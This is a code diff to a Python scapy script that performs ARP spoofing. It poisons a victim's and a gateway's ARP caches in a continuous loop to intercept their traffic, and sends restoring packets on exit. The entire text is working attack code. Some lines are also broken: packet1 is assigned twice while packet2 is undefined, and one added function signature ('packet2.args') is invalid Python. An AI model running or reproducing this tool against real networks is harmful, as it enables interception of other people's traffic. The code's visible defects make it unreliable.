@@ -33,13 +33,13 @@ def packet_spoof(sent_to_ip,spoof_ip,spoof_mac):
 	packet = scapy.ARP(op=2,psrc=spoof_ip,pdst=sent_to_ip,hwdst=spoof_mac)
 	return packet
 
-def correction():
-	packet1 = scapy.ARP(op=2,pdst=victim_ip,hwdst=victim_mac,psrc=gateway_ip,hwsrc=gateway_mac)
-	packet1 = scapy.ARP(op=2,pdst=victim_ip,hwdst=victim_mac,psrc=gateway_ip,hwsrc=gateway_mac)
+def correction(args):
+	packet1 = scapy.ARP(op=2,pdst=args.victim_ip,hwdst=args.victim_mac,psrc=args.gateway_ip,hwsrc=args.gateway_mac)
+	packet1 = scapy.ARP(op=2,pdst=args.victim_ip,hwdst=args.victim_mac,psrc=args.gateway_ip,hwsrc=args.gateway_mac)
 	scapy.send(packet1,verbose=False)
 	scapy.send(packet2,verbose=False)
 
-def arp_attack(packet1,packet2):
+def arp_attack(packet1,packet2.args):
 	count = 0
 	try:
 		while True:
@@ -49,7 +49,7 @@ def arp_attack(packet1,packet2):
 			print('\r[+] Sent packets: {}'.format(count),end='')
 			time.sleep(2)
 	except KeyboardInterrupt:
-		correction()
+		correction(args)
 		print('\n[+] Sent correction packets!\n[+] Detected CTRL C...quitting!')
 
 args = get_args()
@@ -59,4 +59,4 @@ victim_mac = get_mac(victim_ip)
 gateway_mac = get_mac(gateway_ip)
 packet1 = packet_spoof(victim_ip,gateway_ip,victim_mac)
 packet2 = packet_spoof(gateway_ip,victim_ip,gateway_mac)
-arp_attack(packet1,packet2)
+arp_attack(packet1,packet2,args)
